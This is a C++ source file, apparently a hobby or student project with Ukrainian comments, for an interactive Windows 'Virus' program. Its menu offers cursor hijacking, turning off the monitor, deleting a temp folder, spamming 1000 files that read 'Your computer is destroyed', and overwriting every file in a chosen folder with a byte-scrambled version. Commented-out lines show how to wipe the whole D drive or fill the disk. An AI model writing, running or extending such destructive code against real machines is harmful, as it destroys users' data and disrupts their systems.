#include "virus.h"

namespace fs = std::filesystem;

Virus::Virus()
{
    //отримуємо розміри екрану
    this->screen_height = GetSystemMetrics(SM_CXSCREEN);
    this->screen_width = GetSystemMetrics(SM_CYSCREEN);

    choice();
}

void Virus::music()
{
    //запускаємо програвання музики
    std::string pathToMusic = "D:\\music.wav";
    
    if (FileExists(pathToMusic)) {
        ShellExecute(NULL, NULL, L"D:\\music.wav", NULL, NULL, SW_SHOWMAXIMIZED);

        //фіксуємо курсор в кутку на деякий час аби не було можливості вимкнути музику мишею
        for (int i = 0; i < 3000; ++i)
        {
            SetCursorPos(0, 0);
            Sleep(1);
        }
    }
    else
    {
        for (int i = 0; i < 75; ++i)
        {
            std::cout << '\a';
            SetCursorPos(0, 0);
            Sleep(150);
        }
    }
}

void Virus::choice()
{
    int choice;
    //головний цикл програми
    do {
        system("cls");

        //вибираємо яку дію будемо робити з наданих
        std::cout << "how will we block the computer" << std::endl;
        menu();
        std::cin >> choice;
        if (choice < 0) choice = 0;

        //switch для вибору способу блокування роботи
        switch (choice)
        {
        case 1:
            moveMouse(this->screen_height, this->screen_width, 1000);
            break;
        case 2:
            monitor_sleep();
            break;
        case 3:
            music();
            break;
        case 4:
            delete_file();
            break;
        case 5:
            file_creation_spam();
            break;
        case 6:
            std::cout << "Enter path to folder" << std::endl;
            std::cin >> path;
            encrypt_folder(path);
            break;
        default:
            break;
        }
    } while (choice);
}

//функція шифрування даних
//зашифрований символ = символ_тексту + символ_паролю
char Virus::encrypt(char data, char password)
{
    return data + password;
}



void Virus::delete_file()
{
    //видаляємо всі файлі з папки temp на диску D
    std::uintmax_t n = fs::remove_all("D:\\temp");
    
    //якщо запустити цей рядок, то видалиться весь вміст диску D
    //std::uintmax_t n = fs::remove_all("D:\\");

    //показуємо кількість видалених файлів
    std::cout << "Deleted " << n << " files or directories\n";
    system("pause");
}

void Virus::monitor_sleep()
{
    //виключаємо монітор
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
    Sleep(5000);
    //включаємо монітор
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
}

//функція шифрує всі файли в папці
void Virus::encrypt_folder(std::string path)
{
    //цикл перераховує файл в папці
    for (const auto& entry : fs::directory_iterator(path))
    {
        std::vector<char> text;
        std::cout << entry.path() << std::endl;

        std::ifstream fin;
        std::ofstream fout;
        fin.open(entry.path());
        char a;

        if (fin.is_open())
        {
            //в циклі зчитується по одному символу з файла і шифрується
            //після чого поміщається в вектор
            while (!fin.eof())
            {
                fin >> a;
                text.push_back(encrypt(a, a));
            }
            fin.close();
            fout.open(entry.path());
            //з вектора в який раніше записувалися зашифровані дані інформація перезаписується в файл
            for (std::vector<char>::const_iterator i = text.begin(); i != text.end(); ++i)
                fout << *i;
            fout.close();
        }
    }
    system("pause");
}


//функція створює .тхт файли
void Virus::file_creation_spam()
{
    long i = 0;
    const char* path = "C:\\Virus\\";
    std::string content = "Your computer is destroyed get a new one";
    _mkdir(path);
    //якщо зробити true, то формування буде доки не закінчиться місце
    while (/*true*/ i < 1000)
    {
        ++i;
        std::ofstream file;
        file.open(path + std::to_string(i) + ".txt", std::ios_base::out);
        file << content;
        file.close();
        std::cout << "File created " + std::to_string(i) + "\r\n";
    }

}

void Virus::menu()
{
    std::cout << "1. Wiggle cursor" << std::endl;
    std::cout << "2. Turn off the monitor" << std::endl;
    std::cout << "3. Music" << std::endl;
    std::cout << "4. Delete file" << std::endl;
    std::cout << "5. Fill up disk space" << std::endl;
    std::cout << "6. Encrypt folder" << std::endl;
    std::cout << "0. Exit" << std::endl;
}

void Virus::moveMouse(int x, int y, int count)
{
    int movex, movey;
    float angle = 0.0f;

    //ставимо курсор на центр екрана
    SetCursorPos(x / 2, y / 2);

    //рухаємо курсор, координати рахуються таким чином
    //що буде здаватися наче курсор розкручується від центру
    //екрана по спіралі
    for (int i = 0; i <= count; i++) {
        angle = .3 * i;
        movex = (angle * cos(angle) * 2) + x / 2;
        movey = (angle * sin(angle) * 2) + y / 2;
        SetCursorPos(movex, movey);
        Sleep(1);
    }
}

//функція перевіряє чи існує файл
//функція очікує повний шлях до файлу
bool Virus::FileExists(std::string fname)
{
    std::ifstream fin;
    fin.open(fname);
    if (fin.is_open()) {
        fin.close();
        return true;
    }
    return false;
}
